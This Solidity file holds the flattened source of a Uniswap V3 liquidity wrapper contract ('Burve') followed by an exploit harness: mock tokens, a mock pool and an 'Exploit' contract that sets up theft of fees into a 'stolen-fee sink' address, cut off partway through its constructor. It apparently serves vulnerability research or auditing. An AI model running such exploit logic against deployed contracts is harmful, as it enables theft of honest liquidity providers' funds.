        token0 = IERC20_1(pool.token0());
        token1 = IERC20_1(pool.token1());

        island = IKodiakIsland(_island);
        stationProxy = IStationProxy(_stationProxy);

        bool hasIsland = (_island != address(0x0));
        if (hasIsland && address(island.pool()) != _pool) {
            revert MismatchedIslandPool(_island, _pool);
        }

        if (_ranges.length != _weights.length) {
            revert MismatchedRangeWeightLengths(
                _ranges.length,
                _weights.length
            );
        }

        if (_ranges.length == 0) {
            revert NoRanges();
        }

        uint256 rangeIndex = 0;

        // copy optional island range to storage
        if (hasIsland) {
            TickRange memory range = _ranges[rangeIndex];
            if (!range.isIsland()) revert InvalidIslandRange();
            ranges.push(range);
            ++rangeIndex;
        }

        // copy v3 ranges to storage
        int24 tickSpacing = pool.tickSpacing();
        while (rangeIndex < _ranges.length) {
            TickRange memory range = _ranges[rangeIndex];

            if (range.isIsland()) {
                revert InvalidIslandRange();
            }

            if (
                (range.lower % tickSpacing != 0) ||
                (range.upper % tickSpacing != 0)
            ) {
                revert InvalidRange(range.lower, range.upper);
            }

            ranges.push(range);
            ++rangeIndex;
        }

        // compute total sum of weights
        uint256 sum = 0;
        for (uint256 i = 0; i < _weights.length; ++i) {
            sum += _weights[i];
        }

        // calculate distribution for each weighted position
        for (uint256 i = 0; i < _weights.length; ++i) {
            distX96.push((_weights[i] << 96) / sum);
        }

        // Now that the pool is constructed, remember the first mint
        // must be a minimum of 100 deadshares sent to this contract.
    }

    /// @notice Allows the owner to migrate to a new station proxy.
    /// @param newStationProxy The new station proxy to migrate to.
    function migrateStationProxy(IStationProxy newStationProxy) external {
        AdminLib.validateOwner();

        if (address(stationProxy) == address(newStationProxy)) {
            revert MigrateToSameStationProxy();
        }

        emit MigrateStationProxy(stationProxy, newStationProxy);

        stationProxy.migrate(newStationProxy);
        stationProxy = newStationProxy;
    }

    /// @notice mints liquidity for the recipient
    /// @param recipient The recipient of the minted liquidity.
    /// @param mintNominalLiq The amount of nominal liquidity to mint.
    /// @param lowerSqrtPriceLimitX96 The lower price limit of the pool.
    /// @param upperSqrtPriceLimitX96 The upper price limit of the pool.
    function mint(
        address recipient,
        uint128 mintNominalLiq,
        uint160 lowerSqrtPriceLimitX96,
        uint160 upperSqrtPriceLimitX96
    )
        public
        withinSqrtPX96Limits(lowerSqrtPriceLimitX96, upperSqrtPriceLimitX96)
        returns (uint256 shares)
    {
        // compound v3 ranges
        compoundV3Ranges();

        uint256 islandShares = 0;

        // mint liquidity for each range
        for (uint256 i = 0; i < distX96.length; ++i) {
            uint128 liqInRange = uint128(
                shift96(uint256(mintNominalLiq) * distX96[i], true)
            );

            if (liqInRange == 0) {
                continue;
            }

            TickRange memory range = ranges[i];
            if (range.isIsland()) {
                islandShares = mintIsland(recipient, liqInRange);
            } else {
                // mint the V3 ranges
                pool.mint(
                    address(this),
                    range.lower,
                    range.upper,
                    liqInRange,
                    abi.encode(msg.sender)
                );
            }
        }

        // calculate shares to mint
        if (totalShares == 0) {
            // If this is the first mint, it has to be dead shares, burned by giving it to this contract.
            shares = mintNominalLiq;
            if (shares < MIN_DEAD_SHARES)
                revert InsecureFirstMintAmount(shares);
            if (recipient != address(this))
                revert InsecureFirstMintRecipient(recipient);
        } else {
            shares = FullMath_1.mulDiv(
                mintNominalLiq,
                totalShares,
                totalNominalLiq
            );
        }

        // adjust total nominal liquidity
        totalNominalLiq += mintNominalLiq;

        // mint shares
        totalShares += shares;
        _mint(recipient, shares);

        emit Mint(msg.sender, recipient, shares, islandShares);
    }

    /// @notice Mints to the island.
    /// @param recipient The recipient of the minted liquidity.
    /// @param liq The amount of liquidity to mint.
    /// @return mintIslandShares The amount of island shares minted.
    function mintIsland(
        address recipient,
        uint128 liq
    ) internal returns (uint256 mintIslandShares) {
        (uint160 sqrtRatioX96, , , , , , ) = pool.slot0();

        (uint256 amount0, uint256 amount1) = getAmountsForLiquidity(
            sqrtRatioX96,
            liq,
            island.lowerTick(),
            island.upperTick(),
            true
        );
        (uint256 mint0, uint256 mint1, uint256 mintShares) = island
            .getMintAmounts(amount0, amount1);

        islandSharesPerOwner[recipient] += mintShares;
        totalIslandShares += mintShares;

        // transfer required tokens to this contract
        TransferHelper.safeTransferFrom(
            address(token0),
            msg.sender,
            address(this),
            mint0
        );
        TransferHelper.safeTransferFrom(
            address(token1),
            msg.sender,
            address(this),
            mint1
        );

        // approve transfer to the island
        SafeERC20.forceApprove(token0, address(island), amount0);
        SafeERC20.forceApprove(token1, address(island), amount1);

        island.mint(mintShares, address(this));

        SafeERC20.forceApprove(token0, address(island), 0);
        SafeERC20.forceApprove(token1, address(island), 0);

        // deposit minted shares to the station proxy
        SafeERC20.forceApprove(island, address(stationProxy), mintShares);
        stationProxy.depositLP(address(island), mintShares, recipient);
        SafeERC20.forceApprove(island, address(stationProxy), 0);

        return mintShares;
    }

    /// @notice burns liquidity for the msg.sender
    /// @param shares The amount of Burve LP token to burn.
    /// @param lowerSqrtPriceLimitX96 The lower price limit of the pool.
    /// @param upperSqrtPriceLimitX96 The upper price limit of the pool.
    function burn(
        uint256 shares,
        uint160 lowerSqrtPriceLimitX96,
        uint160 upperSqrtPriceLimitX96
    )
        external
        withinSqrtPX96Limits(lowerSqrtPriceLimitX96, upperSqrtPriceLimitX96)
    {
        // compound v3 ranges
        compoundV3Ranges();

        uint128 burnLiqNominal = uint128(
            FullMath_1.mulDiv(shares, uint256(totalNominalLiq), totalShares)
        );

        // adjust total nominal liquidity
        totalNominalLiq -= burnLiqNominal;

        uint256 priorBalance0 = token0.balanceOf(address(this));
        uint256 priorBalance1 = token1.balanceOf(address(this));

        uint256 islandShares = 0;

        // burn liquidity for each range
        for (uint256 i = 0; i < distX96.length; ++i) {
            TickRange memory range = ranges[i];
            if (range.isIsland()) {
                islandShares = burnIsland(shares);
            } else {
                uint128 liqInRange = uint128(
                    shift96(uint256(burnLiqNominal) * distX96[i], false)
                );
                if (liqInRange > 0) {
                    burnV3(range, liqInRange);
                }
            }
        }

        // burn shares
        totalShares -= shares;
        _burn(msg.sender, shares);

        // transfer collected tokens to msg.sender
        uint256 postBalance0 = token0.balanceOf(address(this));
        uint256 postBalance1 = token1.balanceOf(address(this));
        TransferHelper.safeTransfer(
            address(token0),
            msg.sender,
            postBalance0 - priorBalance0
        );
        TransferHelper.safeTransfer(
            address(token1),
            msg.sender,
            postBalance1 - priorBalance1
        );

        emit Burn(msg.sender, shares, islandShares);
    }

    /// @notice Burns share of the island on behalf of msg.sender.
    /// @param shares The amount of Burve LP token to burn.
    /// @return islandBurnShares The amount of island shares burned.
    function burnIsland(
        uint256 shares
    ) internal returns (uint256 islandBurnShares) {
        // calculate island shares to burn
        islandBurnShares = FullMath_1.mulDiv(
            islandSharesPerOwner[msg.sender],
            shares,
            balanceOf(msg.sender)
        );

        if (islandBurnShares == 0) {
            return 0;
        }

        islandSharesPerOwner[msg.sender] -= islandBurnShares;
        totalIslandShares -= islandBurnShares;

        // withdraw burn shares from the station proxy
        stationProxy.withdrawLP(address(island), islandBurnShares, msg.sender);
        island.burn(islandBurnShares, address(this));
    }

    /// @notice Burns liquidity for a v3 range.
    /// @param range The range to burn.
    /// @param liq The amount of liquidity to burn.
    function burnV3(TickRange memory range, uint128 liq) internal {
        (uint256 x, uint256 y) = pool.burn(range.lower, range.upper, liq);

        if (x > type(uint128).max) revert TooMuchBurnedAtOnce(liq, x, true);
        if (y > type(uint128).max) revert TooMuchBurnedAtOnce(liq, y, false);

        pool.collect(
            address(this),
            range.lower,
            range.upper,
            uint128(x),
            uint128(y)
        );
    }

    /// @notice Queries the token amounts in a user's position.
    /// @dev As of now, this method is only used by off-chain queries where the minor errors are negligible. Do not use this where high-precision is required.
    /// @param owner The owner of the position.
    /// @return query0 The amount of token 0.
    /// @return query1 The amount of token 1.
    function queryValue(
        address owner
    ) external view returns (uint256 query0, uint256 query1) {
        // calculate amounts owned in v3 ranges
        uint256 shares = balanceOf(owner);
        (query0, query1) = queryValueV3Ranges(shares);

        // calculate amounts owned by island position
        uint256 ownerIslandShares = islandSharesPerOwner[owner];
        (uint256 island0, uint256 island1) = queryValueIsland(
            ownerIslandShares
        );
        query0 += island0;
        query1 += island1;
    }

    /// @notice Queries the token amounts held by the contract. Ignoring leftover amounts.
    /// @dev As of now, this method is only used by off-chain queries where the minor errors are negligible. Do not use this where high-precision is required.
    /// @return query0 The amount of token 0.
    /// @return query1 The amount of token 1.
    function queryTVL() external view returns (uint256 query0, uint256 query1) {
        // calculate amounts owned in v3 ranges
        (query0, query1) = queryValueV3Ranges(totalShares);

        // calculate amounts owned by island position
        (uint256 island0, uint256 island1) = queryValueIsland(
            totalIslandShares
        );
        query0 += island0;
        query1 += island1;
    }

    /// @notice Queries amounts in the island by simulating a burn.
    /// @dev As of now, this method is only used by off-chain queries where the minor errors are negligible. Do not use this where high-precision is required.
    /// @param islandShares Island shares.
    /// @return query0 The amount of token 0.
    /// @return query1 The amount of token 1.
    function queryValueIsland(
        uint256 islandShares
    ) public view returns (uint256 query0, uint256 query1) {
        if (islandShares == 0) {
            return (0, 0);
        }

        int24 lower = island.lowerTick();
        int24 upper = island.upperTick();
        uint256 totalSupply = island.totalSupply();

        (uint160 sqrtRatioX96, int24 tick, , , , , ) = pool.slot0();

        // get island position id
        bytes32 positionId = keccak256(
            abi.encodePacked(address(island), lower, upper)
        );

        // lookup island position
        (
            uint128 liquidity,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint256 tokensOwed0,
            uint256 tokensOwed1
        ) = pool.positions(positionId);

        // calculate accumulated fees
        (uint256 fees0, uint256 fees1) = FeeLib.viewAccumulatedFees(
            pool,
            lower,
            upper,
            tick,
            liquidity,
            feeGrowthInside0LastX128,
            feeGrowthInside1LastX128
        );
        fees0 += tokensOwed0;
        fees1 += tokensOwed1;

        // subtract manager fee
        (fees0, fees1) = subtractManagerFee(
            fees0,
            fees1,
            island.managerFeeBPS()
        );

        // get amounts for burned liquidity
        uint128 burnedLiq = uint128(
            FullMath_1.mulDiv(liquidity, islandShares, totalSupply)
        );
        (query0, query1) = getAmountsForLiquidity(
            sqrtRatioX96,
            burnedLiq,
            lower,
            upper,
            false
        );

        // award share of fees
        query0 += FullMath_1.mulDiv(
            fees0 +
                token0.balanceOf(address(island)) -
                island.managerBalance0(),
            islandShares,
            totalSupply
        );
        query1 += FullMath_1.mulDiv(
            fees1 +
                token1.balanceOf(address(island)) -
                island.managerBalance1(),
            islandShares,
            totalSupply
        );
    }

    /// @notice Queries amounts in the v3 ranges by simulating burns.
    /// @dev As of now, this method is only used by off-chain queries where the minor errors are negligible. Do not use this where high-precision is required.
    /// @param shares The amount of Burve LP token.
    /// @return query0 The amount of token 0.
    /// @return query1 The amount of token 1.
    function queryValueV3Ranges(
        uint256 shares
    ) public view returns (uint256 query0, uint256 query1) {
        if (shares == 0) {
            return (0, 0);
        }

        (uint160 sqrtRatioX96, int24 tick, , , , , ) = pool.slot0();

        uint256 accumulatedFees0 = 0;
        uint256 accumulatedFees1 = 0;

        uint128 burnLiqNominal = uint128(
            FullMath_1.mulDiv(shares, uint256(totalNominalLiq), totalShares)
        );

        // accumulate total token amounts in the v3 ranges owned by this contract
        for (uint256 i = 0; i < distX96.length; ++i) {
            TickRange memory range = ranges[i];
            if (range.isIsland()) {
                continue;
            }

            // get v3 position id
            bytes32 positionId = keccak256(
                abi.encodePacked(address(this), range.lower, range.upper)
            );

            // lookup v3 position
            // owed tokens will be 0 due to compounding
            (
                uint128 liquidity,
                uint256 feeGrowthInside0LastX128,
                uint256 feeGrowthInside1LastX128,
                ,

            ) = pool.positions(positionId);

            // calculate accumulated fees that would be compounded
            // some amount of tokens will remain on the contract as leftovers because they can't be compounded into a unit of liquidity
            // uncompounded tokens remain on the contract instead of going to the user
            (uint128 fees0, uint128 fees1) = FeeLib.viewAccumulatedFees(
                pool,
                range.lower,
                range.upper,
                tick,
                liquidity,
                feeGrowthInside0LastX128,
                feeGrowthInside1LastX128
            );
            uint128 liqInFees = getLiquidityForAmounts(
                sqrtRatioX96,
                fees0,
                fees1,
                range.lower,
                range.upper
            );
            (
                uint256 compoundedFees0,
                uint256 compoundedFees1
            ) = getAmountsForLiquidity(
                    sqrtRatioX96,
                    liqInFees,
                    range.lower,
                    range.upper,
                    false
                );

            accumulatedFees0 += compoundedFees0;
            accumulatedFees1 += compoundedFees1;

            // get amounts for burned liquidity
            uint128 liqInRange = uint128(
                shift96(uint256(burnLiqNominal) * distX96[i], false)
            );
            (uint256 amount0, uint256 amount1) = getAmountsForLiquidity(
                sqrtRatioX96,
                liqInRange,
                range.lower,
                range.upper,
                false
            );
            query0 += amount0;
            query1 += amount1;
        }

        // matches collected amount adjustment in collectAndCalcCompound
        if (accumulatedFees0 > distX96.length) {
            accumulatedFees0 -= distX96.length;
        } else {
            accumulatedFees0 = 0;
        }

        if (accumulatedFees1 > distX96.length) {
            accumulatedFees1 -= distX96.length;
        } else {
            accumulatedFees1 = 0;
        }

        // calculate share of accumulated fees
        if (accumulatedFees0 > 0) {
            query0 += FullMath_1.mulDiv(accumulatedFees0, shares, totalShares);
        }
        if (accumulatedFees1 > 0) {
            query1 += FullMath_1.mulDiv(accumulatedFees1, shares, totalShares);
        }
    }

    /// @notice Returns info about the contract.
    /// @return info The info struct.
    function getInfo() external view returns (Info memory info) {
        info.pool = pool;
        info.token0 = token0;
        info.token1 = token1;
        info.island = island;
        info.stationProxy = stationProxy;
        info.totalNominalLiq = totalNominalLiq;
        info.totalShares = totalShares;
        info.ranges = ranges;
        info.distX96 = distX96;
    }

    /* Internal Calls */

    /// Override the erc20 update function to handle island share and lp token moves.
    function _update(
        address from,
        address to,
        uint256 value
    ) internal virtual override {
        // We handle mints and burns in their respective calls.
        // We just want to handle transfers between two valid addresses.
        if (
            from != address(0) &&
            to != address(0) &&
            address(island) != address(0)
        ) {
            // Move the island shares that correspond to the LP tokens being moved.
            uint256 islandTransfer = FullMath_1.mulDiv(
                islandSharesPerOwner[from],
                value,
                balanceOf(from)
            );

            islandSharesPerOwner[from] -= islandTransfer;
            // It doesn't matter if this is off by one because the user gets a percent of their island shares on burn.
            islandSharesPerOwner[to] += islandTransfer;
            // We withdraw from the station proxy so the burve earnings stop,
            // but the current owner can collect their earnings so far.
            stationProxy.withdrawLP(address(island), islandTransfer, from);

            SafeERC20.forceApprove(
                island,
                address(stationProxy),
                islandTransfer
            );
            stationProxy.depositLP(address(island), islandTransfer, to);
            SafeERC20.forceApprove(island, address(stationProxy), 0);
        }

        super._update(from, to, value);
    }

    /// @notice Collect fees and compound them for each v3 range.
    function compoundV3Ranges() internal {
        // collect fees
        collectV3Fees();

        (uint160 sqrtRatioX96, , , , , , ) = pool.slot0();

        uint128 compoundedNominalLiq = collectAndCalcCompound();
        if (compoundedNominalLiq == 0) {
            return;
        }

        totalNominalLiq += compoundedNominalLiq;

        // calculate liq and mint amounts
        uint256 totalMint0 = 0;
        uint256 totalMint1 = 0;

        TickRange[] memory memRanges = ranges;
        uint128[] memory compoundLiqs = new uint128[](distX96.length);

        for (uint256 i = 0; i < distX96.length; ++i) {
            TickRange memory range = memRanges[i];

            if (range.isIsland()) {
                continue;
            }

            uint128 compoundLiq = uint128(
                shift96(uint256(compoundedNominalLiq) * distX96[i], true)
            );
            compoundLiqs[i] = compoundLiq;

            if (compoundLiq == 0) {
                continue;
            }

            (uint256 mint0, uint256 mint1) = getAmountsForLiquidity(
                sqrtRatioX96,
                compoundLiq,
                range.lower,
                range.upper,
                true
            );
            totalMint0 += mint0;
            totalMint1 += mint1;
        }

        // approve mints
        SafeERC20.forceApprove(token0, address(this), totalMint0);
        SafeERC20.forceApprove(token1, address(this), totalMint1);

        // mint to each range
        for (uint256 i = 0; i < distX96.length; ++i) {
            TickRange memory range = memRanges[i];

            if (range.isIsland()) {
                continue;
            }

            uint128 compoundLiq = compoundLiqs[i];
            if (compoundLiq == 0) {
                continue;
            }

            pool.mint(
                address(this),
                range.lower,
                range.upper,
                compoundLiq,
                abi.encode(address(this))
            );
        }

        // reset approvals
        SafeERC20.forceApprove(token0, address(this), 0);
        SafeERC20.forceApprove(token1, address(this), 0);
    }

    /* Callbacks */

    function uniswapV3MintCallback(
        uint256 amount0Owed,
        uint256 amount1Owed,
        bytes calldata data
    ) external {
        if (msg.sender != address(pool)) {
            revert UniswapV3MintCallbackSenderNotPool(msg.sender);
        }

        address source = abi.decode(data, (address));
        TransferHelper.safeTransferFrom(
            address(token0),
            source,
            address(pool),
            amount0Owed
        );
        TransferHelper.safeTransferFrom(
            address(token1),
            source,
            address(pool),
            amount1Owed
        );
    }

    /* internal helpers */

    /// @notice Calculates nominal compound liq for the collected token amounts.
    /// @dev Collected amounts are limited to a max of type(uint192).max and
    ///      computed liquidity is limited to a max of type(uint128).max.
    function collectAndCalcCompound()
        internal
        returns (uint128 mintNominalLiq)
    {
        // collected amounts on the contract from: fees, compounded leftovers, or tokens sent to the contract.
        uint256 collected0 = token0.balanceOf(address(this));
        uint256 collected1 = token1.balanceOf(address(this));

        // If we collect more than 2^196 in fees, the problem is with the token.
        // If it was worth any meaningful value the world economy would be in the contract.
        // In this case we compound the maximum allowed such that the contract can still operate.
        if (collected0 > type(uint192).max) {
            collected0 = uint256(type(uint192).max);
        }
        if (collected1 > type(uint192).max) {
            collected1 = uint256(type(uint192).max);
        }

        // when split into n ranges the amount of tokens required can be rounded up
        // we need to make sure the collected amount allows for this rounding
        if (collected0 > distX96.length) {
            collected0 -= distX96.length;
        } else {
            collected0 = 0;
        }

        if (collected1 > distX96.length) {
            collected1 -= distX96.length;
        } else {
            collected1 = 0;
        }

        if (collected0 == 0 && collected1 == 0) {
            return 0;
        }

        // compute liq in collected amounts
        (
            uint256 amount0InUnitLiqX64,
            uint256 amount1InUnitLiqX64
        ) = getCompoundAmountsPerUnitNominalLiqX64();

        uint256 nominalLiq0 = amount0InUnitLiqX64 > 0
            ? (collected0 << 64) / amount0InUnitLiqX64
            : uint256(type(uint128).max);
        uint256 nominalLiq1 = amount1InUnitLiqX64 > 0
            ? (collected1 << 64) / amount1InUnitLiqX64
            : uint256(type(uint128).max);

        uint256 unsafeNominalLiq = nominalLiq0 < nominalLiq1
            ? nominalLiq0
            : nominalLiq1;

        // We should never be able to compound infinite liquidity into both tokens at once, either
        // 1) the contract was misconfigured and only consists of a single island or
        // 2) there is something seriously broken with the underlying v3 pool
        // In either case this event serves as a warning.
        // We don't revert because that would block calls to mint / burn.
        if (unsafeNominalLiq == uint256(type(uint128).max)) {
            emit MalformedPool();
        }

        // min calculated liquidity with the max allowed
        mintNominalLiq = unsafeNominalLiq > type(uint128).max
            ? type(uint128).max
            : uint128(unsafeNominalLiq);

        // during mint the liq at each range is rounded up
        // we subtract by the number of ranges to ensure we have enough liq
        mintNominalLiq = mintNominalLiq <= (2 * distX96.length)
            ? 0
            : mintNominalLiq - uint128(2 * distX96.length);
    }

    /// @notice Calculates token amounts needed for compounding one X64 unit of nominal liquidity in the v3 ranges.
    /// @dev The liquidity distribution at each range is rounded up.
    function getCompoundAmountsPerUnitNominalLiqX64()
        internal
        view
        returns (uint256 amount0InUnitLiqX64, uint256 amount1InUnitLiqX64)
    {
        (uint160 sqrtRatioX96, , , , , , ) = pool.slot0();

        for (uint256 i = 0; i < distX96.length; ++i) {
            TickRange memory range = ranges[i];

            // skip the island
            if (range.isIsland()) {
                continue;
            }

            // calculate amount of tokens in unit of liquidity X64
            uint128 liqInRangeX64 = uint128(
                shift96(uint256(UNIT_NOMINAL_LIQ_X64) * distX96[i], true)
            );
            (
                uint256 range0InUnitLiqX64,
                uint256 range1InUnitLiqX64
            ) = getAmountsForLiquidity(
                    sqrtRatioX96,
                    liqInRangeX64,
                    range.lower,
                    range.upper,
                    true
                );
            amount0InUnitLiqX64 += range0InUnitLiqX64;
            amount1InUnitLiqX64 += range1InUnitLiqX64;
        }
    }

    /// @notice Collects all earned fees for each v3 range.
    function collectV3Fees() internal {
        for (uint256 i = 0; i < distX96.length; ++i) {
            TickRange memory range = ranges[i];

            uint128 liqInRange = uint128(
                shift96(uint256(totalNominalLiq) * distX96[i], true)
            );

            if (liqInRange == 0) {
                continue;
            }

            // skip islands
            if (range.isIsland()) {
                continue;
            }

            // collect fees
            // call to burn is required for uniswap internals to have proper bookkeeping (tokensOwed to be updated)
            pool.burn(range.lower, range.upper, 0);
            pool.collect(
                address(this),
                range.lower,
                range.upper,
                type(uint128).max,
                type(uint128).max
            );
        }
    }

    /// @notice Calculate token amounts in liquidity for the given range.
    /// @param sqrtRatioX96 The current sqrt ratio of the pool.
    /// @param liquidity The amount of liquidity.
    /// @param lower The lower tick of the range.
    /// @param upper The upper tick of the range.
    function getAmountsForLiquidity(
        uint160 sqrtRatioX96,
        uint128 liquidity,
        int24 lower,
        int24 upper,
        bool roundUp
    ) private pure returns (uint256 amount0, uint256 amount1) {
        uint160 sqrtRatioAX96 = TickMath.getSqrtRatioAtTick(lower);
        uint160 sqrtRatioBX96 = TickMath.getSqrtRatioAtTick(upper);

        (amount0, amount1) = LiquidityAmounts.getAmountsForLiquidity(
            sqrtRatioX96,
            sqrtRatioAX96,
            sqrtRatioBX96,
            liquidity,
            roundUp
        );
    }

    /// @notice Calculate liquidity amount in given tokens.
    /// @dev Calculated liq is rounded down.
    /// @param sqrtRatioX96 The current sqrt ratio of the pool.
    /// @param amount0 The amount of token 0.
    /// @param amount1 The amount of token 1.
    /// @param lower The lower tick of the range.
    /// @param upper The upper tick of the range.
    function getLiquidityForAmounts(
        uint160 sqrtRatioX96,
        uint256 amount0,
        uint256 amount1,
        int24 lower,
        int24 upper
    ) private pure returns (uint128 liq) {
        uint160 sqrtRatioAX96 = TickMath.getSqrtRatioAtTick(lower);
        uint160 sqrtRatioBX96 = TickMath.getSqrtRatioAtTick(upper);

        liq = LiquidityAmounts.getLiquidityForAmounts(
            sqrtRatioX96,
            sqrtRatioAX96,
            sqrtRatioBX96,
            amount0,
            amount1
        );
    }

    /// @notice Subtract manager fee from the earned fee.
    /// @param _fee0 The earned fee amount of token 0.
    /// @param _fee1 The earned fee amount of token 1.
    /// @param _managerFeeBPS The manager fee in basis points.
    /// @return fee0 The earned fee minus manager fee for token 0.
    /// @return fee1 The earned fee minus manager fee for token 1.
    function subtractManagerFee(
        uint256 _fee0,
        uint256 _fee1,
        uint16 _managerFeeBPS
    ) private pure returns (uint256 fee0, uint256 fee1) {
        fee0 = _fee0 - (_fee0 * _managerFeeBPS) / 10000;
        fee1 = _fee1 - (_fee1 * _managerFeeBPS) / 10000;
    }

    function shift96(uint256 a, bool roundUp) private pure returns (uint256 b) {
        b = a >> 96;
        if (roundUp && (a & X96_MASK) > 0) b += 1;
    }

    /// @notice Computes the name for the ERC20 token given the pool address.
    /// @param _pool The pool address.
    /// @return name The name of the ERC20 token.
    function nameFromPool(
        address _pool
    ) private view returns (string memory name) {
        address t0 = IUniswapV3Pool(_pool).token0();
        address t1 = IUniswapV3Pool(_pool).token1();
        name = string.concat(
            ERC20(t0).name(),
            "-",
            ERC20(t1).name(),
            "-Stable-KodiakLP"
        );
    }

    /// @notice Computes the symbol for the ERC20 token given the pool address.
    /// @param _pool The pool address.
    /// @return sym The symbol of the ERC20 token.
    function symbolFromPool(
        address _pool
    ) private view returns (string memory sym) {
        address t0 = IUniswapV3Pool(_pool).token0();
        address t1 = IUniswapV3Pool(_pool).token1();
        sym = string.concat(
            ERC20(t0).symbol(),
            "-",
            ERC20(t1).symbol(),
            "-SLP-KDK"
        );
    }
}
// ===== END: flattened real Burve source =====

// ===== Exploit harness (minimal real ERC20 + faithful V3 pool double + attacker) =====
contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) { name = n; symbol = s; }
    function mint(address to, uint256 a) external { totalSupply += a; balanceOf[to] += a; }
    function approve(address sp, uint256 a) external returns (bool) { allowance[msg.sender][sp] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;
    }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        uint256 al = allowance[f][msg.sender];
        if (al != type(uint256).max) allowance[f][msg.sender] = al - a;
        balanceOf[f] -= a; balanceOf[to] += a; return true;
    }
}

/// Faithful minimal Uniswap V3 pool double (the opaque DEX venue). Uses the REAL
/// vendored Uniswap math for mint/burn amounts at a settable price; fees are
/// modeled as owed tokens on the position (the finding's external precondition).
contract MockV3Pool {
    address public immutable token0;
    address public immutable token1;
    int24 public immutable tickSpacing;
    uint160 public sqrtPriceX96;
    int24 public tick;

    struct Position { uint128 liquidity; uint128 owed0; uint128 owed1; uint128 fee0; uint128 fee1; }
    mapping(bytes32 => Position) internal _pos;

    constructor(address t0, address t1, int24 spacing, uint160 sqrtP) {
        token0 = t0; token1 = t1; tickSpacing = spacing; _setPrice(sqrtP);
    }
    function _key(address o, int24 lo, int24 hi) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(o, lo, hi));
    }
    function setPrice(uint160 sqrtP) external { _setPrice(sqrtP); }
    function _setPrice(uint160 sqrtP) internal { sqrtPriceX96 = sqrtP; tick = TickMath.getTickAtSqrtRatio(sqrtP); }
    function accrueFees(address o, int24 lo, int24 hi, uint128 f0, uint128 f1) external {
        Position storage p = _pos[_key(o, lo, hi)]; p.fee0 += f0; p.fee1 += f1;
    }
    function slot0() external view returns (uint160, int24, uint16, uint16, uint16, uint32, bool) {
        return (sqrtPriceX96, tick, 0, 0, 0, 0, true);
    }
    function mint(address recipient, int24 lo, int24 hi, uint128 amount, bytes calldata data)
        external returns (uint256 amount0, uint256 amount1)
    {
        (amount0, amount1) = _amounts(lo, hi, amount, true);
        _pos[_key(recipient, lo, hi)].liquidity += amount;
        uint256 b0 = IERC20_1(token0).balanceOf(address(this));
        uint256 b1 = IERC20_1(token1).balanceOf(address(this));
        IUniswapV3MintCallback(msg.sender).uniswapV3MintCallback(amount0, amount1, data);
        require(IERC20_1(token0).balanceOf(address(this)) >= b0 + amount0, "M0");
        require(IERC20_1(token1).balanceOf(address(this)) >= b1 + amount1, "M1");
    }
    function burn(int24 lo, int24 hi, uint128 amount) external returns (uint256 amount0, uint256 amount1) {
        Position storage p = _pos[_key(msg.sender, lo, hi)];
        p.owed0 += p.fee0; p.owed1 += p.fee1; p.fee0 = 0; p.fee1 = 0; // poke rolls fees into owed
        if (amount > 0) {
            (amount0, amount1) = _amounts(lo, hi, amount, false);
            require(p.liquidity >= amount, "burn>liq");
            p.liquidity -= amount;
            p.owed0 += uint128(amount0); p.owed1 += uint128(amount1);
        }
    }
    function collect(address recipient, int24 lo, int24 hi, uint128 req0, uint128 req1)
        external returns (uint128 amount0, uint128 amount1)
    {
        Position storage p = _pos[_key(msg.sender, lo, hi)];
        amount0 = req0 > p.owed0 ? p.owed0 : req0;
        amount1 = req1 > p.owed1 ? p.owed1 : req1;
        p.owed0 -= amount0; p.owed1 -= amount1;
        if (amount0 > 0) IERC20_1(token0).transfer(recipient, amount0);
        if (amount1 > 0) IERC20_1(token1).transfer(recipient, amount1);
    }
    function positions(bytes32 key) external view returns (uint128, uint256, uint256, uint128, uint128) {
        Position storage p = _pos[key]; return (p.liquidity, 0, 0, p.owed0, p.owed1);
    }
    function feeGrowthGlobal0X128() external pure returns (uint256) { return 0; }
    function feeGrowthGlobal1X128() external pure returns (uint256) { return 0; }
    function ticks(int24) external pure returns (uint128, int128, uint256, uint256, int56, uint160, uint32, bool) {
        return (0, 0, 0, 0, 0, 0, 0, false);
    }
    function _amounts(int24 lo, int24 hi, uint128 liq, bool roundUp) internal view returns (uint256, uint256) {
        return LiquidityAmounts.getAmountsForLiquidity(
            sqrtPriceX96, TickMath.getSqrtRatioAtTick(lo), TickMath.getSqrtRatioAtTick(hi), liq, roundUp
        );
    }
}

contract Exploit {
    address internal constant ALICE = 0x000000000000000000000000000000000000a11c; // honest LP holder
    address internal constant SINK  = 0x000000000000000000000000000000000000D00d; // stolen-fee sink

    int24 internal constant LO = -60;
    int24 internal constant HI = 60;
    int24 internal constant SPACING = 60;
    uint160 internal constant LO_LIMIT = 1;
    uint160 internal constant HI_LIMIT = type(uint160).max;

    MockERC20 public t0;
    MockERC20 public t1;
    MockV3Pool public pool;
    Burve public burve;

    uint160 internal SP_MID;
    uint160 internal SP_BELOW;
    uint160 internal SP_ABOVE;

    uint256 public stuckFees;
    uint256 public skimmed;

    constructor() {
        SP_MID   = TickMath.getSqrtRatioAtTick(0);
        SP_BELOW = TickMath.getSqrtRatioAtTick(-180); // below range -> token1 fees stuck
        SP_ABOVE = TickMath.getSqrtRatioAtTick(180);  // above range -> stuck fees compound

        t0 = new MockERC20("Token0", "T0");
        t1 = new MockERC20("Token1", "T1");
        pool = new MockV3Pool(address(t0), address(t1), SPACING, SP_MID);

        // deep external pool liquidity (other LPs) so above-range burns can be paid
        t0.mint(address(pool), 1_000_000e18);
        t1.mint(address(pool), 1_000_000e18);

        TickRange[] memory ranges = new TickRange[](1);
        ranges[0] = TickRange({lower: LO, upper: HI});
        uint128[] memory weights = new uint128[](1);
        weights[0] = 1;
        burve = new Burve(address(pool), address(0), address(0xDEAD), ranges, weights);

        // this contract funds every mint (dead shares, alice's position, and its own)
        t0.mint(address(this), 10_000_000e18);
        t1.mint(address(this), 10_000_000e18);
        t0.approve(address(burve), type(uint256).max);
        t1.approve(address(burve), type(uint256).max);

        // required dead-share first mint (recipient must be the pool wrapper)
        burve.mint(address(burve), 1_000e18, LO_LIMIT, HI_LIMIT);
        // honest LP alice provides a large in-range position (this contract pays)
